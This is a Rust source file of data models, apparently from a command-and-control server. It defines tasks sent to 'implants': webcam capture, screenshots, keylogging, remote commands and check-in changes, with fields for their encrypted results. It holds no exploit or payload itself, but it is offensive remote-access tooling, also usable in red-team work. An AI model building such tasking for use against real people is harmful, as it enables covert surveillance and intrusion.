use crate::schema::*;
use chrono;
use diesel::{Associations, Identifiable, Insertable, Queryable};
use serde::{Deserialize, Serialize};
use std::str::FromStr;
use uuid;

use crate::models::implant::Implant;

#[derive(Debug, PartialEq)]
pub enum Tasks {
    GetInfo,
    TakePicture,
    TakeScreenshot,
    Keylogger,
    Command,
    ChangeCheckIn,
}

impl FromStr for Tasks {
    type Err = ();

    fn from_str(input: &str) -> Result<Self, Self::Err> {
        match input {
            "get_info" => Ok(Tasks::GetInfo),
            "take_picture" => Ok(Tasks::TakePicture),
            "take_screenshot" => Ok(Tasks::TakeScreenshot),
            "keylogger" => Ok(Tasks::Keylogger),
            "command" => Ok(Tasks::Command),
            "change_check_in" => Ok(Tasks::ChangeCheckIn),
            _ => Err(()),
        }
    }
}

#[derive(Debug, Identifiable, Associations, Serialize, Deserialize, Insertable, Queryable)]
#[primary_key(task_id)]
#[belongs_to(Implant)]
#[table_name = "tasks"]
pub struct Task {
    pub task_id: uuid::Uuid,
    pub task: String,
    pub value: Option<String>,
    pub task_created_at: chrono::NaiveDateTime,
    pub task_status: String,
    pub result_content: Option<String>,
    pub result_nonce: Option<String>,
    pub result_created_at: Option<chrono::NaiveDateTime>,
    pub implant_id: uuid::Uuid,
}

impl Task {
    pub fn new(
        task: String,
        value: Option<String>,
        task_status: String,
        implant_id: uuid::Uuid,
    ) -> Self {
        Task {
            task_id: uuid::Uuid::new_v4(),
            task,
            value,
            task_created_at: chrono::Local::now().naive_local(),
            task_status,
            result_content: None,
            result_nonce: None,
            result_created_at: None,
            implant_id,
        }
    }
}

#[derive(Deserialize)]
pub struct AddTaskRequest {
    pub implant_id: uuid::Uuid,
    pub task: String,
    pub value: String,
}

#[derive(Debug, Serialize)]
pub struct ResponseTask {
    pub task_id: uuid::Uuid,
    pub task: String,
    pub value: Option<String>,
    pub implant_id: uuid::Uuid,
}

impl ResponseTask {
    pub fn new(
        task_id: uuid::Uuid,
        value: Option<String>,
        task: String,
        implant_id: uuid::Uuid,
    ) -> Self {
        ResponseTask {
            task_id,
            task,
            value,
            implant_id,
        }
    }
}

#[derive(Serialize)]
pub struct AllTasksResponse {
    pub tasks: Vec<Task>,
}

impl AllTasksResponse {
    pub fn new(tasks: Vec<Task>) -> Self {
        AllTasksResponse { tasks }
    }
}
